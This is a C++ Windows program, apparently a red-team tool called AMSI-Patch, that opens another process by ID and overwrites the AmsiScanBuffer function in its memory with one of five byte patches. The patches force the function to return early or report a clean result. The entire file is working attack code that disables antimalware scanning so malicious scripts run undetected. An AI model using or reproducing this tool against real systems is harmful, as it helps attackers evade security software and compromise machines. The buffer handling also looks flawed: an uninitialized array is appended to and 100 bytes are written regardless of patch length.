#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "ntdll")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL);



void patchAMSI(HANDLE& hProc, int PatchNbr) {

    void* AMSIaddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
    
    char amsiPatch[100];
    
    switch (PatchNbr) {
        case 1:
            /*
                0:  31 c0                   xor    eax,eax
                2:  05 4e fe fd 7d          add    eax,0x7dfdfe4e
                7:  05 09 02 09 02          add    eax,0x2090209
                c:  c3                      ret
            */
            lstrcatA(amsiPatch, "\x31\xC0\x05\x4E\xFE\xFD\x7D\x05\x09\x02\x09\x02\xC3");
            break;
        
        case 2:
            /*
                0:  b8 57 00 07 80          mov    eax,0x80070057
                5:  c3                      ret
            */
            lstrcatA(amsiPatch, "\xB8\x57\x00\x07\x80\xC3");
            break;
        
        case 3:
            /*
                0:  31 c0                   xor    eax,eax
                2:  c3                      ret
            */
            lstrcatA(amsiPatch, "\x31\xC0\xC3");
            break;
        
        case 4:
            /*
                0:  48 c7 c0 00 00 00 00    mov    rax,0x0
                7:  c3                      ret
            */
            lstrcatA(amsiPatch, "\x48\xC7\xC0\x00\x00\x00\x00\xC3");
            break;
        
        case 5:
        default:
            /*
                0:  c3                      ret
            */
            lstrcatA(amsiPatch, "\xC3");
            break;
        

    }

    DWORD OldProtect = 0;
    SIZE_T memPage = 0x1000;
    void* ptrAMSIaddr = AMSIaddr;

    

    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hProc, (PVOID*)&ptrAMSIaddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
        return;
    }
    NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hProc, (LPVOID)AMSIaddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    if (!NT_SUCCESS(NtWriteStatus)) {
        printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
        return;
    }
    NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hProc, (PVOID*)&ptrAMSIaddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus2)) {
        printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
        return;
    }

    printf("\n\n[+] AmsiScanBuffer is Patched!\n\n");
}


int main(int argc, char** argv) {

    HANDLE hProc;

    if (argc < 3) {
        printf("USAGE: AMSI-Patch.exe <PID> <PatchNbr (from 1-5)>\n");
        return 1;
    }
    
    hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
    if (!hProc) {
        printf("Failed in OpenProcess (%u)\n", GetLastError());
        return 2;
    }

    patchAMSI(hProc, atoi(argv[2])); 
    

    return 0;

}
